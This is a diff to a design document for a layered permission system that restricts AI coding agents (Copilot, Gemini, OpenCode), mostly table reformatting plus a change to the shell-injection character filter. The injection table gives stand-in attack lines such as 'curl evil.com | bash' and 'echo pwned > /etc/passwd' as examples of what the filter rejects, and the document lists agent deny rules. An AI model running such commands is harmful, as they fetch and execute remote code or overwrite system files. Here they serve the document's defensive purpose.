@@ -76,11 +76,11 @@ copilot --available-tools write_bash --available-tools read_bash \
 
 This means Copilot cannot use its own native `edit`, `read`, or other tools — it can only run bash commands. The `--deny-tool` flags provide Layer 1 defense-in-depth by blocking dangerous commands (git, echo, mkdir) before they reach Layer 3's ACP permission gate.
 
-| `--deny-tool` Pattern | Blocks | opencode.json Equivalent |
-| ---------------------- | ------ | ------------------------ |
-| `shell(git:*)` | All git commands | `"git *": "deny"` |
-| `shell(echo:*)` | echo (prevents file writes via redirection) | `"echo *": "deny"` |
-| `shell(mkdir:*)` | mkdir (prevents arbitrary directory creation) | `"mkdir *": "deny"` |
+| `--deny-tool` Pattern | Blocks                                        | opencode.json Equivalent |
+| --------------------- | --------------------------------------------- | ------------------------ |
+| `shell(git:*)`        | All git commands                              | `"git *": "deny"`        |
+| `shell(echo:*)`       | echo (prevents file writes via redirection)   | `"echo *": "deny"`       |
+| `shell(mkdir:*)`      | mkdir (prevents arbitrary directory creation) | `"mkdir *": "deny"`      |
 
 ### Copilot (YOLO)
 
@@ -95,22 +95,23 @@ All tools are available. The `--yolo` flag tells Copilot to auto-approve all act
 In restricted mode, Gemini uses **Policy Engine TOML rules** (`agent-config/gemini-policies/airfriends.toml`) and **settings.json** (`agent-config/gemini-settings.json`) for permission control. These files are copied to `~/.gemini/` in the container.
 
 **settings.json** configures:
+
 - `defaultApprovalMode: "default"` — all tool calls require permission check
 - `enableAutoUpdate: false` — no auto-updates in container
 - `folderTrust.enabled: false` — no trust dialogs (non-interactive)
 
 **Policy Engine rules** mirror `opencode.json`:
 
-| Rule | Decision | Priority | opencode.json Equivalent |
-| ---- | -------- | -------- | ------------------------ |
-| `write_file`, `replace` | deny | 200 | `"edit": "ask"` (delegated to Layer 3) |
-| `ask_user` | deny (all modes) | 200 | `"question": "deny"` |
-| `save_memory` | deny | 200 | N/A (Gemini-specific) |
-| `run_shell_command` (default) | deny | 10 | `"bash": { "*": "deny" }` |
-| `run_shell_command` (`deno run`) | allow | 100 | `"deno run *skills/*": "allow"` |
-| `run_shell_command` (`rg`, `curl`, etc.) | allow | 100 | `"rg *": "allow"`, etc. |
-| `run_shell_command` (`agent-browser`) | allow | 100 | `"agent-browser *": "allow"` |
-| `run_shell_command` (`git`, `echo`, `mkdir`) | deny | 200 | `"git *": "deny"`, etc. |
+| Rule                                         | Decision         | Priority | opencode.json Equivalent               |
+| -------------------------------------------- | ---------------- | -------- | -------------------------------------- |
+| `write_file`, `replace`                      | deny             | 200      | `"edit": "ask"` (delegated to Layer 3) |
+| `ask_user`                                   | deny (all modes) | 200      | `"question": "deny"`                   |
+| `save_memory`                                | deny             | 200      | N/A (Gemini-specific)                  |
+| `run_shell_command` (default)                | deny             | 10       | `"bash": { "*": "deny" }`              |
+| `run_shell_command` (`deno run`)             | allow            | 100      | `"deno run *skills/*": "allow"`        |
+| `run_shell_command` (`rg`, `curl`, etc.)     | allow            | 100      | `"rg *": "allow"`, etc.                |
+| `run_shell_command` (`agent-browser`)        | allow            | 100      | `"agent-browser *": "allow"`           |
+| `run_shell_command` (`git`, `echo`, `mkdir`) | deny             | 200      | `"git *": "deny"`, etc.                |
 
 Rules with `modes = ["default", "auto_edit", "plan"]` are inactive in YOLO mode. The `ask_user` rule has no `modes` field — it is always active (no human to answer).
 
@@ -146,17 +147,17 @@ OpenCode's pattern matching uses a **regex-based engine**, not standard glob. Pa
 2. `*` is converted to `.*` (matches any characters **including** `/` — crosses directory boundaries)
 3. `?` is converted to `.` (matches exactly one character)
 
-| Feature | Behavior |
-|---|---|
-| `*` | Matches any characters **including path separators** (`/`). Unlike standard glob where `*` only matches within a single directory level. |
-| `**` | Functionally equivalent to `*` (since `*` already crosses directories). |
-| `?` | Matches exactly one character. |
-| `~` | ✅ Expanded to user home directory. |
-| `$HOME` | ✅ Expanded to user home directory. |
-| `${HOME}` | ❌ **Not expanded** — braces are regex-escaped to literal characters. |
-| Other env vars | ❌ Not supported (`$TMPDIR`, `$AGENT_WORKSPACE`, etc. are not expanded). |
-| `{a,b}` | ❌ Brace expansion not supported — braces are escaped as literal characters. |
-| Rule priority | **Last-match-wins** — rules are evaluated in order; the last matching rule takes precedence. |
+| Feature        | Behavior                                                                                                                                 |
+| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
+| `*`            | Matches any characters **including path separators** (`/`). Unlike standard glob where `*` only matches within a single directory level. |
+| `**`           | Functionally equivalent to `*` (since `*` already crosses directories).                                                                  |
+| `?`            | Matches exactly one character.                                                                                                           |
+| `~`            | ✅ Expanded to user home directory.                                                                                                      |
+| `$HOME`        | ✅ Expanded to user home directory.                                                                                                      |
+| `${HOME}`      | ❌ **Not expanded** — braces are regex-escaped to literal characters.                                                                    |
+| Other env vars | ❌ Not supported (`$TMPDIR`, `$AGENT_WORKSPACE`, etc. are not expanded).                                                                 |
+| `{a,b}`        | ❌ Brace expansion not supported — braces are escaped as literal characters.                                                             |
+| Rule priority  | **Last-match-wins** — rules are evaluated in order; the last matching rule takes precedence.                                             |
 
 > **Important**: Because only `~` and `$HOME` are expanded, all permission patterns in `opencode.json` must use either **absolute paths** (e.g., `/app/data/agent-workspace/**/*.md`) or **`~`/`$HOME`-relative paths** (e.g., `~/.agents/skills/**`). Other environment variables will be treated as literal strings and never match real file paths.
 
@@ -176,19 +177,19 @@ This behavior is specific to the `edit` permission — other permissions (e.g., 
 
 The `agent-config/opencode.json` in the project configures permissions for the `build` agent (OpenCode's primary agent):
 
-| Category                                                    | Permission   | Rationale                               |
-| ----------------------------------------------------------- | ------------ | --------------------------------------- |
-| **Default (`*`)**                                           | `deny`       | Non-interactive system rejects unknowns |
-| **Read-only tools** (`read`, `list`, `glob`, `grep`, `lsp`) | `allow`      | Safe exploration — no side effects      |
-| **Session management** (`todoread`, `todowrite`)            | `allow`      | Internal agent organization tools       |
-| **Sub-task spawning** (`task`)                              | `deny`       | Non-interactive system — no sub-agent coordination |
-| **Skills** (`skill`)                                        | `allow`      | Core SKILL.md discovery and loading     |
-| **Web access** (`webfetch`, `websearch`, `codesearch`)      | `allow`      | Research and information gathering      |
-| **Interactive** (`question`)                                | `deny`       | No human operator to answer questions   |
-| **Loop protection** (`doom_loop`)                           | `deny`       | Prevent infinite retry loops            |
-| **File editing** (`edit`)                                   | `ask` (delegated) | Delegated to Layer 3 via `"ask"` (see below) |
-| **Shell commands** (`bash`)                                 | Whitelist    | Specific patterns only (see below)      |
-| **External directories**                                    | Restricted   | Skills and agent workspace only         |
+| Category                                                    | Permission        | Rationale                                          |
+| ----------------------------------------------------------- | ----------------- | -------------------------------------------------- |
+| **Default (`*`)**                                           | `deny`            | Non-interactive system rejects unknowns            |
+| **Read-only tools** (`read`, `list`, `glob`, `grep`, `lsp`) | `allow`           | Safe exploration — no side effects                 |
+| **Session management** (`todoread`, `todowrite`)            | `allow`           | Internal agent organization tools                  |
+| **Sub-task spawning** (`task`)                              | `deny`            | Non-interactive system — no sub-agent coordination |
+| **Skills** (`skill`)                                        | `allow`           | Core SKILL.md discovery and loading                |
+| **Web access** (`webfetch`, `websearch`, `codesearch`)      | `allow`           | Research and information gathering                 |
+| **Interactive** (`question`)                                | `deny`            | No human operator to answer questions              |
+| **Loop protection** (`doom_loop`)                           | `deny`            | Prevent infinite retry loops                       |
+| **File editing** (`edit`)                                   | `ask` (delegated) | Delegated to Layer 3 via `"ask"` (see below)       |
+| **Shell commands** (`bash`)                                 | Whitelist         | Specific patterns only (see below)                 |
+| **External directories**                                    | Restricted        | Skills and agent workspace only                    |
 
 ### Edit Permission (Delegated via `"ask"`)
 
@@ -317,10 +318,10 @@ When `sandbox.filterEnv` is `true` (default), the agent subprocess only receives
 
 **Agent-type-specific:**
 
-| Agent    | Additional variables                                                                                        |
-| -------- | ----------------------------------------------------------------------------------------------------------- |
-| Copilot  | `GITHUB_TOKEN`, `COPILOT_GITHUB_TOKEN`                                                                      |
-| Gemini   | `GEMINI_API_KEY`, `GEMINI_SYSTEM_MD`                                                                        |
+| Agent    | Additional variables                                                                       |
+| -------- | ------------------------------------------------------------------------------------------ |
+| Copilot  | `GITHUB_TOKEN`, `COPILOT_GITHUB_TOKEN`                                                     |
+| Gemini   | `GEMINI_API_KEY`, `GEMINI_SYSTEM_MD`                                                       |
 | OpenCode | `GEMINI_API_KEY`, `OPENROUTER_API_KEY`, `OPENCODE_API_KEY`, `GOOGLE_GENERATIVE_AI_API_KEY` |
 
 Additional env vars can be added via `sandbox.allowedEnvVars` config array.
@@ -343,7 +344,7 @@ YOLO mode bypasses permission restrictions at multiple layers simultaneously:
 | Layer                   | YOLO Behavior                                                                                                               |
 | ----------------------- | --------------------------------------------------------------------------------------------------------------------------- |
 | Layer 1 (Agent CLI)     | Copilot: `--yolo` flag, no `--available-tools` restrictions. Gemini: `--yolo` flag. OpenCode: ACP `setSessionMode("yolo")`. |
-| Layer 2 (opencode.json) | OpenCode switches to `yolo` agent via `setSessionMode` — all permissions become `allow`.                                     |
+| Layer 2 (opencode.json) | OpenCode switches to `yolo` agent via `setSessionMode` — all permissions become `allow`.                                    |
 | Layer 3 (ACP Client)    | `requestPermission()` auto-approves every request.                                                                          |
 | Layer 4 (File Boundary) | Unchanged — path boundaries still enforced.                                                                                 |
 | Layer 5 (Sandbox)       | Unchanged — env filtering and network isolation still apply.                                                                |
@@ -401,14 +402,14 @@ These sessions use synthetic identifiers (e.g., platform=`"discord"`, userId=`"s
 
 ### Comparison Table
 
-| Aspect                          | Copilot                                                                                       | Gemini                | OpenCode                     |
-| ------------------------------- | --------------------------------------------------------------------------------------------- | --------------------- | ---------------------------- |
-| **Binary**                      | `copilot`                                                                                     | `gemini`              | `opencode`                   |
-| **ACP flag**                    | `--acp`                                                                                       | `--experimental-acp`  | `acp` (subcommand)           |
-| **YOLO flag**                   | `--yolo`                                                                                      | `--yolo`              | ACP `setSessionMode("yolo")` |
-| **Tool restriction** (non-YOLO) | `--available-tools (bash only) + --deny-tool (git, echo, mkdir)`                              | Policy Engine TOML rules | `opencode.json` (Layer 2)    |
+| Aspect                          | Copilot                                                                                       | Gemini                             | OpenCode                     |
+| ------------------------------- | --------------------------------------------------------------------------------------------- | ---------------------------------- | ---------------------------- |
+| **Binary**                      | `copilot`                                                                                     | `gemini`                           | `opencode`                   |
+| **ACP flag**                    | `--acp`                                                                                       | `--experimental-acp`               | `acp` (subcommand)           |
+| **YOLO flag**                   | `--yolo`                                                                                      | `--yolo`                           | ACP `setSessionMode("yolo")` |
+| **Tool restriction** (non-YOLO) | `--available-tools (bash only) + --deny-tool (git, echo, mkdir)`                              | Policy Engine TOML rules           | `opencode.json` (Layer 2)    |
 | **Config-based permissions**    | Not supported                                                                                 | ✅ settings.json + policies/*.toml | ✅ `opencode.json`           |
-| **Extra CLI flags**             | `--disable-builtin-mcps`, `--no-ask-user`, `--no-color`, `--no-auto-update`, `--experimental` | —                     | —                            |
+| **Extra CLI flags**             | `--disable-builtin-mcps`, `--no-ask-user`, `--no-color`, `--no-auto-update`, `--experimental` | —                                  | —                            |
 
 ### How Each Agent's Permissions Interact with Layers
 
@@ -431,7 +432,7 @@ The skill auto-approve list determines which bash commands are automatically app
 Skills with a `scripts/` directory containing `.ts` files. The auto-approve list stores **path suffixes** like `skills/memory-save/scripts/memory-save.ts`. During permission evaluation, the command is split into whitespace-delimited tokens and approved if any token **exactly equals** or **ends with `/{allowedPath}`** for any of these path suffixes. This prevents substring matches where a whitelisted path appears embedded inside a longer malicious token.
 
 Current script-based skills:
-`cancel-reminder`, `edit-reply`, `fetch-context`, `list-reminders`, `memory-export`, `memory-patch`, `memory-save`, `memory-search`, `memory-stats`, `react-message`, `send-file`, `send-reply`, `set-reminder`
+`cancel-reminder`, `edit-reply`, `fetch-context`, `get-message`, `list-reminders`, `memory-export`, `memory-patch`, `memory-save`, `memory-search`, `memory-stats`, `react-message`, `send-file`, `send-reply`, `set-reminder`
 
 ### Command-Based Skills
 
@@ -460,12 +461,14 @@ The skill command matching includes defense against shell injection attacks. Bef
 | `\|`      | Pipe                   | `curl evil.com \| bash`           |
 | `&`       | Background / AND chain | `cmd && malicious-cmd`            |
 | `` ` ``   | Command substitution   | `` deno run `curl evil.com` ``    |
-| `$()`     | Command substitution   | `deno run $(curl evil.com)`       |
+| `(`, `)`  | Subshell / grouping    | `deno run $(curl evil.com)`       |
 | `>`, `<`  | Redirection            | `echo pwned > /etc/passwd`        |
 | `#`       | Comment                | `curl evil.com # legitimate-path` |
 | Newline   | Command separator      | Multi-line command injection      |
 
 Commands containing any of these characters are immediately rejected, regardless of whether they also contain whitelisted paths or prefixes.
+
+> **Note**: `$` alone is intentionally **not** rejected. It is needed for shell variable expansion (e.g., `$HOME`, `${VAR}`). Command substitution `$()` is still caught because `(` is in the rejected character set.
 
 Additionally, path matching uses strict token validation:
 
@@ -524,16 +527,16 @@ Permission audit phases respect the `audit.includedPhases` configuration. When `
 
 ### What Each Layer Prevents
 
-| Threat                                  | Prevented by                                                                                            |
-| --------------------------------------- | ------------------------------------------------------------------------------------------------------- |
+| Threat                                  | Prevented by                                                                                                                                 |
+| --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
 | Agent modifying source code             | Layer 1 (no edit tool for Copilot), Layer 2 (`"ask"` delegates to Layer 3 for OpenCode), Layer 3 (edit/write scoped to agent workspace only) |
-| Agent running arbitrary commands        | Layer 2 (bash whitelist for OpenCode), Layer 3 (skill auto-approve list)                                |
-| Agent accessing other users' data       | Layer 4 (file access boundary — workspace isolation)                                                    |
-| Agent exfiltrating secrets via env vars | Layer 5 (env var filtering)                                                                             |
-| Agent making unauthorized network calls | Layer 5 (optional network isolation)                                                                    |
-| Agent committing/pushing to git         | Layer 2 (git denied for OpenCode), Layer 3 (not in skill list)                                          |
-| Agent writing non-allowed file types    | Layer 2 (`"ask"` delegates to Layer 3 for OpenCode), Layer 3 (extension check), Layer 4 (writeTextFile check) |
-| Permission bypass undetected            | All permission decisions (approved and denied) are recorded in per-session audit logs with full context |
+| Agent running arbitrary commands        | Layer 2 (bash whitelist for OpenCode), Layer 3 (skill auto-approve list)                                                                     |
+| Agent accessing other users' data       | Layer 4 (file access boundary — workspace isolation)                                                                                         |
+| Agent exfiltrating secrets via env vars | Layer 5 (env var filtering)                                                                                                                  |
+| Agent making unauthorized network calls | Layer 5 (optional network isolation)                                                                                                         |
+| Agent committing/pushing to git         | Layer 2 (git denied for OpenCode), Layer 3 (not in skill list)                                                                               |
+| Agent writing non-allowed file types    | Layer 2 (`"ask"` delegates to Layer 3 for OpenCode), Layer 3 (extension check), Layer 4 (writeTextFile check)                                |
+| Permission bypass undetected            | All permission decisions (approved and denied) are recorded in per-session audit logs with full context                                      |
 
 ### Known Limitations
 
@@ -541,7 +544,7 @@ Permission audit phases respect the `audit.includedPhases` configuration. When `
 
 2. **OpenCode's Layer 2 is only as strong as opencode.json**: If the configuration file is modified, all Layer 2 protections are bypassed. YOLO mode is controlled via ACP `setSessionMode("yolo")`, which switches to the permissive `yolo` agent defined in `opencode.json`.
 
-3. **Layer 3 relies on shell operator detection**: Layer 3 rejects commands containing shell meta-characters (`;`, `|`, `&`, `` ` ``, `$()`, `>`, `<`, `#`, newlines) and validates script paths as complete whitespace-delimited tokens and command prefixes as exact first-token matches. While this prevents known injection patterns (command chaining, piping, comment hiding), novel shell features or encoding tricks not covered by the character set could theoretically bypass the check.
+3. **Layer 3 relies on shell operator detection**: Layer 3 rejects commands containing shell meta-characters (`;`, `|`, `&`, `` ` ``, `(`, `)`, `>`, `<`, `#`, newlines) and validates script paths as complete whitespace-delimited tokens and command prefixes as exact first-token matches. `$` alone is intentionally allowed for variable expansion; `$()` is caught via `(`. While this prevents known injection patterns (command chaining, piping, comment hiding), novel shell features or encoding tricks not covered by the character set could theoretically bypass the check.
 
 4. **Self-research and memory maintenance always run in restricted mode**: There is no way to enable per-channel YOLO for these internal sessions — only the global `--yolo` flag works. This is by design (synthetic identifiers), but means trusted-channel YOLO configs don't apply to background tasks.
 
@@ -562,7 +565,10 @@ agent:
     filterEnv: true # Filter env vars to allowed list (default: true)
     networkIsolation: false # Linux network namespace isolation (default: false)
     allowedEnvVars: [] # Additional env var names to allow through
-    allowedWriteExtensions: [".md", ".txt"] # Allowed file extensions for agent workspace writes in restricted mode
+    allowedWriteExtensions: [
+      ".md",
+      ".txt",
+    ] # Allowed file extensions for agent workspace writes in restricted mode
 
   # Skill auto-approve list (optional — falls back to scanning skills/ dir)
   autoApproveSkills:
@@ -591,13 +597,13 @@ audit:
 
 ### Environment Variables
 
-| Variable                          | Config Path                      | Description          |
-| --------------------------------- | -------------------------------- | -------------------- |
-| `AGENT_SANDBOX_FILTER_ENV`        | `agent.sandbox.filterEnv`        | `"true"` / `"false"` |
-| `AGENT_SANDBOX_NETWORK_ISOLATION` | `agent.sandbox.networkIsolation` | `"true"` / `"false"` |
-| `AGENT_SANDBOX_ALLOWED_ENV_VARS`  | `agent.sandbox.allowedEnvVars`   | Comma-separated list |
+| Variable                                 | Config Path                            | Description          |
+| ---------------------------------------- | -------------------------------------- | -------------------- |
+| `AGENT_SANDBOX_FILTER_ENV`               | `agent.sandbox.filterEnv`              | `"true"` / `"false"` |
+| `AGENT_SANDBOX_NETWORK_ISOLATION`        | `agent.sandbox.networkIsolation`       | `"true"` / `"false"` |
+| `AGENT_SANDBOX_ALLOWED_ENV_VARS`         | `agent.sandbox.allowedEnvVars`         | Comma-separated list |
 | `AGENT_SANDBOX_ALLOWED_WRITE_EXTENSIONS` | `agent.sandbox.allowedWriteExtensions` | Comma-separated list |
-| `AGENT_AUTO_APPROVE_SKILLS`       | `agent.autoApproveSkills`        | Comma-separated list |
+| `AGENT_AUTO_APPROVE_SKILLS`              | `agent.autoApproveSkills`              | Comma-separated list |
 
 ### OpenCode-Specific
 
